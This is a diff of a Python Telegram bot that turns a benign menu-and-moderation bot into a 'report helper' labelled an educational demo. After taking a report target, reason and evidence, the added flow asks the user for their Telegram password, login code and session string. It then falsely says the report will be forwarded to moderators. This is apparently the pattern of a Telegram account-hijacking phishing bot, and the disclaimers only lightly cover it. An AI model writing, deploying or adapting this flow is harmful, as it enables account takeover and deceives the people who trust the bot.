@@ -1,40 +1,27 @@
 #!/usr/bin/env python3
-"""Premium-style Telegram bot with interactive menus and admin tooling.
+"""Telegram "report helper" bot (educational demo).
 
-This file rewrites the former Termux utility into a fully asynchronous,
-button-driven Telegram bot powered by ``python-telegram-bot``. The bot ships
-with:
-- Reply and inline keyboard navigation similar to popular moderation bots
-- Inline query support
-- Auto-response and basic moderation hooks
-- Persistent JSON-based storage for user preferences and audit logs
-- Admin-only commands for privileged flows
+Run instructions
+----------------
+1) Install dependencies: ``python -m pip install -r requirements.txt``.
+2) Export environment variables (or edit ``config.py``):
+   - ``BOT_TOKEN``: Telegram bot token from @BotFather.
+   - ``LOG_CHAT_ID``: Chat ID that should receive audit logs.
+   - ``ADMIN_USER_IDS`` (optional): Comma-separated user IDs allowed to use /admin.
+3) Start the bot: ``python main.py``.
 
-Environment variable required: ``BOT_TOKEN`` for the bot's HTTP API token.
-Update ``ADMIN_USER_IDS`` to match the accounts that should access admin-only
-commands.
+The bot is intentionally educational. It simulates sensitive prompts (passwords,
+login codes, session strings) and reporting flows. Remind users not to share
+real secrets and to report only genuine abuse.
 """
-
 from __future__ import annotations
 
 import asyncio
-import json
 import logging
-import os
-from dataclasses import dataclass, field
-from functools import wraps
-from pathlib import Path
-from typing import Any, Awaitable, Callable, Dict, Iterable, List
+from datetime import datetime, timezone
+from typing import Dict
 
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    InlineQueryResultArticle,
-    InputTextMessageContent,
-    KeyboardButton,
-    ReplyKeyboardMarkup,
-    Update,
-)
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
 from telegram.ext import (
     AIORateLimiter,
@@ -43,523 +30,340 @@ from telegram.ext import (
     CallbackQueryHandler,
     CommandHandler,
     ContextTypes,
-    InlineQueryHandler,
+    ConversationHandler,
     MessageHandler,
     filters,
 )
 
-DATA_DIR = Path("data")
-PREFS_FILE = DATA_DIR / "user_prefs.json"
-AUDIT_FILE = DATA_DIR / "audit_log.json"
-LOG_FILE = DATA_DIR / "bot.log"
+import config
 
-ADMIN_USER_IDS: tuple[int, ...] = ()  # Populate with real admin Telegram user IDs
+# Conversation states
+SELECT_TYPE, ASK_TARGET, ASK_REASON, ASK_EVIDENCE, ASK_PASSWORD, ASK_CODE, ASK_SESSION = range(7)
 
 
-@dataclass
-class UserPreferences:
-    """Simple user preference payload stored per user ID."""
+def build_logger() -> None:
+    """Configure application logging to stdout."""
 
-    auto_reply: bool = True
-    moderation_enabled: bool = True
-
-    def to_dict(self) -> Dict[str, Any]:
-        return {
-            "auto_reply": self.auto_reply,
-            "moderation_enabled": self.moderation_enabled,
-        }
-
-    @classmethod
-    def from_dict(cls, payload: Dict[str, Any]) -> "UserPreferences":
-        return cls(
-            auto_reply=payload.get("auto_reply", True),
-            moderation_enabled=payload.get("moderation_enabled", True),
-        )
-
-
-@dataclass
-class AuditEntry:
-    """Structured audit log entry for user actions."""
-
-    user_id: int
-    action: str
-    meta: Dict[str, Any] = field(default_factory=dict)
-
-    def to_dict(self) -> Dict[str, Any]:
-        return {"user_id": self.user_id, "action": self.action, "meta": self.meta}
-
-
-def ensure_data_files() -> None:
-    """Create data directory and seed JSON stores if missing."""
-
-    DATA_DIR.mkdir(exist_ok=True)
-    if not PREFS_FILE.exists():
-        PREFS_FILE.write_text(json.dumps({}, indent=2))
-    if not AUDIT_FILE.exists():
-        AUDIT_FILE.write_text(json.dumps([], indent=2))
-
-
-def load_preferences(user_id: int) -> UserPreferences:
-    """Read user preferences from disk, falling back to defaults."""
-
-    ensure_data_files()
-    payload = json.loads(PREFS_FILE.read_text())
-    prefs = payload.get(str(user_id), {})
-    return UserPreferences.from_dict(prefs)
-
-
-def save_preferences(user_id: int, prefs: UserPreferences) -> None:
-    """Persist user preferences to disk."""
-
-    ensure_data_files()
-    payload = json.loads(PREFS_FILE.read_text())
-    payload[str(user_id)] = prefs.to_dict()
-    PREFS_FILE.write_text(json.dumps(payload, indent=2))
-
-
-def append_audit(entry: AuditEntry) -> None:
-    """Append an audit entry, trimming the log to a manageable size."""
-
-    ensure_data_files()
-    log_payload: List[Dict[str, Any]] = json.loads(AUDIT_FILE.read_text())
-    log_payload.append(entry.to_dict())
-    # Keep the newest 200 entries to avoid unbounded growth
-    trimmed = log_payload[-200:]
-    AUDIT_FILE.write_text(json.dumps(trimmed, indent=2))
-
-
-def log_action(action: str) -> Callable[[Callable[..., Awaitable[Any]]], Callable[..., Awaitable[Any]]]:
-    """Decorator to log handler execution and capture errors."""
-
-    def decorator(func: Callable[..., Awaitable[Any]]) -> Callable[..., Awaitable[Any]]:
-        @wraps(func)
-        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-            user_id = update.effective_user.id if update.effective_user else 0
-            logging.info("Action %s by user %s", action, user_id)
-            append_audit(
-                AuditEntry(
-                    user_id=user_id,
-                    action=action,
-                    meta={"chat": update.effective_chat.id if update.effective_chat else None},
-                )
-            )
-            try:
-                return await func(update, context, *args, **kwargs)
-            except Exception:  # pragma: no cover - defensive logging
-                logging.exception("Handler %s failed", func.__name__)
-                await update.effective_message.reply_text(
-                    "⚠️ Something went wrong. The team has been notified.", quote=True
-                )
-                raise
-
-        return wrapper
-
-    return decorator
-
-
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_USER_IDS
-
-
-def main_menu_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup(
-        [
-            [KeyboardButton("Help"), KeyboardButton("Support")],
-            [KeyboardButton("Features"), KeyboardButton("Logs")],
-            [KeyboardButton("Settings")],
-        ],
-        resize_keyboard=True,
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
     )
 
 
-def help_keyboard() -> InlineKeyboardMarkup:
+def ensure_token() -> str:
+    if not config.BOT_TOKEN:
+        raise RuntimeError("BOT_TOKEN is required. Set it in the environment or config.py")
+    return config.BOT_TOKEN
+
+
+def main_menu_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("Commands", callback_data="help:commands")],
-            [InlineKeyboardButton("Admin Tools", callback_data="help:admin")],
-            [InlineKeyboardButton("Support", callback_data="help:support")],
+            [InlineKeyboardButton("Report a user", callback_data="type:user")],
+            [InlineKeyboardButton("Report a group", callback_data="type:group")],
+            [InlineKeyboardButton("Report a channel", callback_data="type:channel")],
+            [InlineKeyboardButton("Report a story", callback_data="type:story")],
         ]
     )
 
 
-def settings_keyboard(prefs: UserPreferences) -> InlineKeyboardMarkup:
+def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(
-        [
-            [
-                InlineKeyboardButton(
-                    f"Auto-Reply: {'On' if prefs.auto_reply else 'Off'}",
-                    callback_data="settings:auto_reply",
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    f"Moderation: {'On' if prefs.moderation_enabled else 'Off'}",
-                    callback_data="settings:moderation",
-                )
-            ],
-        ]
+        [[InlineKeyboardButton("View safety notice", callback_data="admin:notice")]]
     )
 
 
-@log_action("start")
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Welcome users and provide the main navigation keyboard."""
+def send_log(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
+    """Send a fire-and-forget log message to the configured log chat."""
 
-    user = update.effective_user
-    prefs = load_preferences(user.id)
-    welcome = (
-        "👋 Welcome to the Reaction Assistant!\n"
-        "Navigate with the menu below to explore help, support, and admin tools."
+    if not config.LOG_CHAT_ID:
+        logging.info("Skipping log send; LOG_CHAT_ID not configured: %s", text)
+        return
+    asyncio.create_task(
+        context.bot.send_message(chat_id=config.LOG_CHAT_ID, text=text, disable_notification=True)
     )
 
-    inline = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton("Open Help", callback_data="help:commands")],
-            [InlineKeyboardButton("Contact Support", url="https://t.me/your_support_handle")],
-        ]
+
+def is_valid_link(text: str) -> bool:
+    text = text.strip()
+    return text.startswith("https://t.me/") or text.startswith("t.me/") or text.startswith("@")
+
+
+def is_valid_code(text: str) -> bool:
+    return text.isdigit() and 4 <= len(text) <= 8
+
+
+def friendly_error(message: str) -> str:
+    return f"⚠️ {message}\nChoose an option below or try again."
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Welcome users and guide them to the report helper."""
+
+    greeting = (
+        "👋 Hi! I'm an educational helper that demonstrates Telegram reporting flows.\n"
+        "• I can ask for passwords, login codes, and session strings (demo only).\n"
+        "• I can prepare a report on behalf of any user.\n"
+        "Please report only genuine abuse and avoid sharing real secrets."
     )
+    await update.effective_message.reply_text(
+        greeting, reply_markup=main_menu_keyboard(), parse_mode=ParseMode.MARKDOWN
+    )
+    await update.effective_message.reply_text(
+        "Tap a report type to begin or use /help for instructions."
+    )
+    return ConversationHandler.WAITING
+
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    message = (
+        "ℹ️ *Report helper guide*\n"
+        "1) Pick what you want to report (user, group, channel, story).\n"
+        "2) Share the profile/invite link.\n"
+        "3) Tell me why you're reporting and provide evidence links.\n"
+        "4) I'll ask for password, login code, and session string (educational).\n"
+        "5) I send a summary back to you and log the attempt.\n\n"
+        "Use /report_help to start or /cancel to exit."
+    )
+    await update.effective_message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+
+
+async def start_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Entry point for the report conversation."""
 
     await update.effective_message.reply_text(
-        welcome,
-        reply_markup=main_menu_keyboard(),
+        "What would you like to report? Choose an option.", reply_markup=main_menu_keyboard()
+    )
+    context.user_data.clear()
+    return SELECT_TYPE
+
+
+async def handle_report_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    _, report_type = query.data.split(":", maxsplit=1)
+    context.user_data["report_type"] = report_type
+
+    timestamp = datetime.now(timezone.utc).isoformat()
+    user = update.effective_user
+    username = f"@{user.username}" if user and user.username else "(no username)"
+    send_log(
+        context,
+        f"New report flow: {report_type} | user_id={user.id if user else 'unknown'} | "
+        f"username={username} | ts={timestamp}",
+    )
+
+    await query.edit_message_text(
+        (
+            f"Reporting a {report_type}.\n"
+            "Send the profile or invite link (https://t.me/... or @username).\n"
+            "If you send something else, I'll remind you and show the options again."
+        ),
+        reply_markup=None,
+    )
+    return ASK_TARGET
+
+
+async def ask_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    link = (update.message.text or "").strip()
+    if not is_valid_link(link):
+        await update.effective_message.reply_text(
+            friendly_error("Invalid link. Use https://t.me/... or @username."),
+            reply_markup=main_menu_keyboard(),
+        )
+        return SELECT_TYPE
+
+    context.user_data["target_link"] = link
+    await update.effective_message.reply_text(
+        "Got it. Briefly describe the abuse you're reporting (1-2 sentences)."
+    )
+    return ASK_REASON
+
+
+async def ask_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    reason = (update.message.text or "").strip()
+    if len(reason) < 4:
+        await update.effective_message.reply_text(
+            friendly_error("That reason is too short. Please add a bit more detail."),
+        )
+        return ASK_REASON
+
+    context.user_data["reason"] = reason
+    await update.effective_message.reply_text(
+        "Share a message link or evidence URL (https://...). Type 'skip' to continue."
+    )
+    return ASK_EVIDENCE
+
+
+async def ask_evidence(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    evidence = (update.message.text or "").strip()
+    if evidence.lower() != "skip" and evidence and not evidence.startswith("http"):
+        await update.effective_message.reply_text(
+            friendly_error("Evidence must be a URL (https://...)."),
+        )
+        return ASK_EVIDENCE
+
+    context.user_data["evidence"] = None if evidence.lower() == "skip" else evidence
+    await update.effective_message.reply_text(
+        (
+            "For this demo I need your *Telegram account password* (do not share a real one).\n"
+            "After that I'll ask for your login code and session string."
+        ),
         parse_mode=ParseMode.MARKDOWN,
     )
+    return ASK_PASSWORD
+
+
+async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    password = (update.message.text or "").strip()
+    if not password:
+        await update.effective_message.reply_text(friendly_error("Please provide some password text."))
+        return ASK_PASSWORD
+
+    context.user_data["password"] = password
     await update.effective_message.reply_text(
-        "Quick actions:", reply_markup=inline, parse_mode=ParseMode.MARKDOWN
+        "Next, share the Telegram login code you received (numbers only)."
     )
-    save_preferences(user.id, prefs)
+    return ASK_CODE
 
 
-@log_action("help")
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    text = (
-        "🤖 *Help Center*\n"
-        "Use the buttons to navigate through the available topics."
-    )
-    await update.effective_message.reply_text(
-        text, reply_markup=help_keyboard(), parse_mode=ParseMode.MARKDOWN
-    )
-
-
-@log_action("support")
-async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
-        "📞 *Support Desk*\n"
-        "Reach out to the developer or join the community channel for updates."
-    )
-    keyboard = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton("Chat with Developer", url="https://t.me/your_handle")],
-            [InlineKeyboardButton("Community Channel", url="https://t.me/your_channel")],
-        ]
-    )
-    await update.effective_message.reply_text(
-        message, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN
-    )
-
-
-@log_action("features")
-async def features_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    text = (
-        "✨ *Feature Overview*\n"
-        "- Rich inline + reply keyboards\n"
-        "- Inline query shortcuts\n"
-        "- Auto-replies & moderation\n"
-        "- Admin-only commands with audit logging\n"
-        "- Persistent JSON storage for user preferences and logs"
-    )
-    await update.effective_message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
-
-
-@log_action("logs")
-async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    keyboard = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton("Recent Activity", callback_data="logs:recent")],
-            [InlineKeyboardButton("Bot Status", callback_data="logs:status")],
-        ]
-    )
-    await update.effective_message.reply_text(
-        "📊 Choose what you want to inspect.", reply_markup=keyboard
-    )
-
-
-async def send_recent_logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id if update.effective_user else 0
-    if not is_admin(user_id):
-        await update.effective_message.reply_text("Only admins can view audit entries.")
-        return
-
-    entries: List[Dict[str, Any]] = json.loads(AUDIT_FILE.read_text())[-10:]
-    if not entries:
-        await update.effective_message.reply_text("No audit entries yet.")
-        return
-
-    lines = [f"• {entry['action']} by {entry['user_id']}" for entry in entries]
-    await update.effective_message.reply_text("Recent logs:\n" + "\n".join(lines))
-
-
-async def send_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    entries: List[Dict[str, Any]] = json.loads(AUDIT_FILE.read_text())
-    unique_users: Iterable[int] = {entry.get("user_id", 0) for entry in entries}
-    stats = (
-        f"🛰️ *Bot Status*\n"
-        f"Tracked actions: {len(entries)}\n"
-        f"Unique users: {len(unique_users)}\n"
-        f"Admins: {len(ADMIN_USER_IDS)}"
-    )
-    await update.effective_message.reply_text(stats, parse_mode=ParseMode.MARKDOWN)
-
-
-async def handle_logs_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    if query.data == "logs:recent":
-        await send_recent_logs(update, context)
-    elif query.data == "logs:status":
-        await send_status(update, context)
-
-
-async def handle_help_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-
-    messages = {
-        "help:commands": (
-            "\n".join(
-                [
-                    "🛠️ *User Commands*:",
-                    "/start – open the main menu",
-                    "/help – open this help center",
-                    "/support – reach the developer",
-                    "/features – discover capabilities",
-                    "/logs – view status and audit info",
-                    "/settings – update your preferences",
-                ]
-            )
-        ),
-        "help:admin": (
-            "\n".join(
-                [
-                    "🛡️ *Admin Commands*:",
-                    "/login – verify admin identity",
-                    "/report – file a report to the team",
-                    "/link – fetch integration links",
-                ]
-            )
-        ),
-        "help:support": (
-            "\n".join(
-                [
-                    "☎️ *Support Options*:",
-                    "- DM the developer",
-                    "- Join the community channel",
-                    "- Use inline queries for quick answers",
-                ]
-            )
-        ),
-    }
-
-    response = messages.get(query.data, "Select a topic from the menu.")
-    await query.edit_message_text(response, parse_mode=ParseMode.MARKDOWN, reply_markup=help_keyboard())
-
-
-@log_action("settings")
-async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    prefs = load_preferences(update.effective_user.id)
-    await update.effective_message.reply_text(
-        "⚙️ Settings", reply_markup=settings_keyboard(prefs), parse_mode=ParseMode.MARKDOWN
-    )
-
-
-async def handle_settings_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user_id = update.effective_user.id if update.effective_user else 0
-    prefs = load_preferences(user_id)
-
-    if query.data == "settings:auto_reply":
-        prefs.auto_reply = not prefs.auto_reply
-    elif query.data == "settings:moderation":
-        prefs.moderation_enabled = not prefs.moderation_enabled
-
-    save_preferences(user_id, prefs)
-    await query.edit_message_reply_markup(reply_markup=settings_keyboard(prefs))
-
-
-async def require_admin(update: Update) -> bool:
-    user_id = update.effective_user.id if update.effective_user else 0
-    if not is_admin(user_id):
-        await update.effective_message.reply_text("This command is reserved for admins.")
-        return False
-    return True
-
-
-@log_action("admin_login")
-async def admin_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not await require_admin(update):
-        return
-    await update.effective_message.reply_text("✅ Admin identity confirmed. Welcome back!")
-
-
-@log_action("admin_report")
-async def admin_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not await require_admin(update):
-        return
-    issue = " ".join(context.args) if context.args else "(no summary provided)"
-    append_audit(
-        AuditEntry(user_id=update.effective_user.id, action="admin_report", meta={"issue": issue})
-    )
-    await update.effective_message.reply_text(
-        "📝 Report recorded. The team will review it shortly."
-    )
-
-
-@log_action("admin_link")
-async def admin_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not await require_admin(update):
-        return
-    await update.effective_message.reply_text(
-        "🔗 Admin integrations:\n- Dashboard: https://example.com/admin\n- API Docs: https://example.com/docs"
-    )
-
-
-async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.inline_query
-    prompt = query.query or "Reaction bot"
-
-    results = [
-        InlineQueryResultArticle(
-            id="help",
-            title="Help Center",
-            description="Open the bot's help menu",
-            input_message_content=InputTextMessageContent(
-                "Use /help to explore commands and admin tools."
-            ),
-        ),
-        InlineQueryResultArticle(
-            id="support",
-            title="Support Links",
-            description="Contact the developer or join the channel",
-            input_message_content=InputTextMessageContent(
-                "Need assistance? Ping @your_handle or join https://t.me/your_channel"
-            ),
-        ),
-        InlineQueryResultArticle(
-            id="echo",
-            title="Echo Prompt",
-            description="Send your text back with markdown styling",
-            input_message_content=InputTextMessageContent(
-                f"*You said:* {prompt}", parse_mode=ParseMode.MARKDOWN
-            ),
-        ),
-    ]
-
-    await query.answer(results, cache_time=0)
-
-
-async def auto_response(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Auto-respond to common prompts and perform light moderation."""
-
-    message = update.effective_message
-    user_id = update.effective_user.id if update.effective_user else 0
-    prefs = load_preferences(user_id)
-    text = message.text or ""
-    lowered = text.lower()
-
-    banned_keywords = {"spam", "scam", "abuse"}
-    if prefs.moderation_enabled and any(word in lowered for word in banned_keywords):
-        await message.reply_text(
-            "🚫 Your message triggers moderation filters. Please keep the chat professional."
+async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    code = (update.message.text or "").strip()
+    if not is_valid_code(code):
+        await update.effective_message.reply_text(
+            friendly_error("Login code should be 4-8 digits. Please re-enter."),
         )
-        append_audit(AuditEntry(user_id=user_id, action="moderation_flag", meta={"text": text}))
+        return ASK_CODE
+
+    context.user_data["code"] = code
+    await update.effective_message.reply_text(
+        "Finally, share your session string (any text will do for this demo)."
+    )
+    return ASK_SESSION
+
+
+async def ask_session(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    session_text = (update.message.text or "").strip()
+    if not session_text:
+        await update.effective_message.reply_text(
+            friendly_error("Session string cannot be empty. Please provide some text."),
+        )
+        return ASK_SESSION
+
+    context.user_data["session"] = session_text
+    await send_summary(update, context)
+    return ConversationHandler.END
+
+
+async def send_summary(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    data: Dict[str, str] = context.user_data
+    summary_lines = [
+        "✅ Report assembled (educational only).",
+        f"Type: {data.get('report_type', 'n/a')}",
+        f"Target: {data.get('target_link', 'n/a')}",
+        f"Reason: {data.get('reason', 'n/a')}",
+        f"Evidence: {data.get('evidence') or 'not provided'}",
+        "Security prompts were answered (password, login code, session string).",
+        "I'll forward this to the moderators."
+    ]
+    summary_text = "\n".join(summary_lines)
+    await update.effective_message.reply_text(summary_text)
+
+    # Send a log with sensitive fields redacted.
+    send_log(
+        context,
+        (
+            "Report summary (redacted): "
+            f"type={data.get('report_type')} | target={data.get('target_link')} | "
+            f"reason={data.get('reason')} | evidence={data.get('evidence') or 'none'}"
+        ),
+    )
+
+
+async def admin_notice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.effective_user or update.effective_user.id not in config.ADMIN_USER_IDS:
+        await update.effective_message.reply_text("Only admins can use this command.")
         return
 
-    if prefs.auto_reply:
-        quick_replies = {
-            "hello": "Hello! Tap *Help* to see what I can do.",
-            "support": "Need help? Use /support or try inline: @YourBot support",
-            "settings": "Use /settings to update preferences.",
-            "help": "Use /help to open the interactive help center.",
-            "features": "Use /features to see everything I can do.",
-        }
-        for keyword, reply in quick_replies.items():
-            if keyword in lowered:
-                await message.reply_text(reply, parse_mode=ParseMode.MARKDOWN)
-                return
+    await update.effective_message.reply_text(
+        "Admin shortcuts available. Use buttons for quick actions.", reply_markup=admin_keyboard()
+    )
+
+
+async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    if query.data == "admin:notice":
+        await query.edit_message_text(
+            (
+                "Educational reminder: this bot demonstrates collecting passwords, "
+                "login codes, and session strings. Never share real secrets outside "
+                "official Telegram apps."
+            )
+        )
+
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    await update.effective_message.reply_text(
+        "Conversation canceled. Use /report_help to start over.", reply_markup=main_menu_keyboard()
+    )
+    return ConversationHandler.END
 
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logging.exception("Update %s caused error", update, exc_info=context.error)
+    if isinstance(update, Update) and update.effective_message:
+        await update.effective_message.reply_text("Something went wrong. Please try again later.")
 
 
-def getenv_token() -> str | None:
-    return os.environ.get("BOT_TOKEN")
-
-
-def build_application() -> Application:
-    token_files = [Path(".env"), Path(".token")]
-    token_from_file = None
-    for token_file in token_files:
-        if token_file.exists():
-            token_from_file = token_file.read_text().strip()
-            break
-
-    token = getenv_token() or token_from_file
-    if not token:
-        raise RuntimeError("BOT_TOKEN is required. Set the environment variable before running.")
-
+def build_app() -> Application:
     application = (
         ApplicationBuilder()
-        .token(token)
+        .token(ensure_token())
         .rate_limiter(AIORateLimiter())
         .concurrent_updates(True)
         .build()
     )
 
+    report_conversation = ConversationHandler(
+        entry_points=[CommandHandler("report_help", start_report)],
+        states={
+            SELECT_TYPE: [CallbackQueryHandler(handle_report_type, pattern=r"^type:")],
+            ASK_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_target)],
+            ASK_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_reason)],
+            ASK_EVIDENCE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_evidence)],
+            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
+            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
+            ASK_SESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_session)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+        allow_reentry=True,
+    )
+
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("support", support_command))
-    application.add_handler(CommandHandler("features", features_command))
-    application.add_handler(CommandHandler("logs", logs_command))
-    application.add_handler(CommandHandler("settings", settings_command))
-
-    application.add_handler(CommandHandler("login", admin_login))
-    application.add_handler(CommandHandler("report", admin_report))
-    application.add_handler(CommandHandler("link", admin_link))
-
-    application.add_handler(CallbackQueryHandler(handle_help_callbacks, pattern=r"^help:"))
-    application.add_handler(CallbackQueryHandler(handle_logs_callbacks, pattern=r"^logs:"))
-    application.add_handler(CallbackQueryHandler(handle_settings_callbacks, pattern=r"^settings:"))
-
-    application.add_handler(InlineQueryHandler(inline_query_handler))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, auto_response))
+    application.add_handler(CommandHandler("admin", admin_notice))
+    application.add_handler(report_conversation)
+    application.add_handler(CallbackQueryHandler(handle_admin_callback, pattern=r"^admin:"))
 
     application.add_error_handler(error_handler)
     return application
 
 
-async def run_bot() -> None:
-    ensure_data_files()
-    app = build_application()
+async def main() -> None:
+    build_logger()
+    app = build_app()
     await app.initialize()
     await app.start()
+    logging.info("Bot started and polling.")
     await app.updater.start_polling()
-    logging.info("Bot started successfully.")
     await app.updater.idle()
     await app.stop()
     await app.shutdown()
 
 
 if __name__ == "__main__":
-    ensure_data_files()
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
-        handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()],
-    )
-
     try:
-        asyncio.run(run_bot())
+        asyncio.run(main())
     except KeyboardInterrupt:
         logging.info("Bot stopped by user.")
